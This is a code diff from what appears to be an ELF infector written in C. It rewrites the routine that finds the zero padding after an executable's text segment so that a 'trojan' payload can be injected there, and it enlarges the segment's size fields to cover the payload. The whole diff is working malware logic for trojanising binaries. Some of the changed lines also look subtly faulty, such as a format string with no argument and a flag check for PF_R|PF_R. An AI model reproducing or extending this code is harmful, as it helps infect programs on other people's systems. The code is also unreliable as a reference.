@@ -82,42 +82,42 @@ infect_t *inf_load(elf_t *elfo, FILE *trojan, open_mode_t m,
 elf_off_t inf_scan_segment(infect_t *inf) {
     ASSERT_ARG_RET_VAL(inf && inf->elfo, 0);
 
-    elf_phdr_t *pdata_after_check = NULL;
-    elf_phdr_t *pdata = NULL;
-    elf_off_t len = 0;
     bool pass_check = false;
-    short found = 0;
 
     int nr = inf->elfo->pmap[PT_LOAD].nr;
-    for (int i = 0; i < nr && len == 0; ++i) {
-        int idx = inf->elfo->pmap[PT_LOAD].map[i];
-        pdata = inf->elfo->phdrs[idx];
-        /** .text? */
-        if (!(found & PF_X) && pdata->p_type == PT_LOAD /* code */ && pdata->p_flags == (PF_R|PF_X))
-        {
-            inf->pad.target_offset = pdata->p_offset + pdata->p_filesz;
-            /** If ELF is .so = ehdr->e_type */
-            inf->pad.lsb_so_addr = inf->pad.target_offset;
-            /** If ELF is EXEC = ehdr->e_type, p_filesz: Size of segment in disk */
-            inf->pad.lsb_exec_addr = pdata->p_vaddr + pdata->p_filesz;
+    if (nr != 2) {
+        log_error("Wait!? %d loadable sections?!\n");
+        return (elf_off_t)0;
+    }
 
-            /** Save it for now, will write later if check is OK */
-            pdata_after_check = pdata;
-            found |= PF_X;
-            continue;
-        }
-         /** .data should come just in the next loop after .text */
-        if ((found & PF_X) && pdata->p_type == PT_LOAD && pdata->p_flags == (PF_R|PF_W)) {
-            /** Total padding size (zeroes) between .text and .data */
-            len = pdata->p_offset - inf->pad.lsb_so_addr;
-            found |= PF_W;
-            break;
-        }
+    elf_phdr_t *text = NULL;
+    elf_phdr_t *data = NULL;
+    int idx0 = inf->elfo->pmap[PT_LOAD].map[0];
+    int idx1 = inf->elfo->pmap[PT_LOAD].map[1];
+    elf_word_t flags0 = inf->elfo->phdrs[idx0]->p_flags;
+    elf_word_t flags1 = inf->elfo->phdrs[idx1]->p_flags;
+
+    if (flags0 == (PF_R|PF_X) && flags1 == (PF_R|PF_W)) { /** .text,.data */
+        text = inf->elfo->phdrs[idx0];
+        data = inf->elfo->phdrs[idx1];
+    } else if (flags0 == (PF_R|PF_W) && flags1 == (PF_R|PF_R)) { /** .data,.text */
+        text = inf->elfo->phdrs[idx1];
+        data = inf->elfo->phdrs[idx0];
     }
-    if (!(found & PF_X) || !(found & PF_W)) {
-        log_error("Unexpected or missing section(s)\n");
-        return false;
+
+    if (!text || !data) {
+        log_error("Wait!? Unexpected loadable segment\n");
+        return (elf_off_t)0;
     }
+
+    inf->pad.target_offset = text->p_offset + text->p_filesz;
+    /** If ELF is .so = ehdr->e_type */
+    inf->pad.lsb_so_addr = inf->pad.target_offset;
+    /** If ELF is EXEC = ehdr->e_type, p_filesz: Size of segment in disk */
+    inf->pad.lsb_exec_addr = text->p_vaddr + text->p_filesz;
+
+    /** Total padding size (zeroes) between .text and .data */
+    elf_off_t len = data->p_offset - inf->pad.lsb_so_addr;
 
     if (len < inf->src_bin_size) {
         log_error("No available space for infection, not written\n");
@@ -128,8 +128,8 @@ elf_off_t inf_scan_segment(infect_t *inf) {
     if (_inf_check_padding((unsigned char*)inf->elfo->mapaddr +
                 inf->pad.target_offset, len) == true) {
         /** Update to the new mem & file size */
-        pdata_after_check->p_memsz = pdata_after_check->p_memsz + inf->src_bin_size;
-        pdata_after_check->p_filesz = pdata_after_check->p_filesz + inf->src_bin_size;
+        text->p_memsz = text->p_memsz + inf->src_bin_size;
+        text->p_filesz = text->p_filesz + inf->src_bin_size;
         pass_check = true;
     } else {
         log_error("Error: Invalid padding - not all zeroes\n");
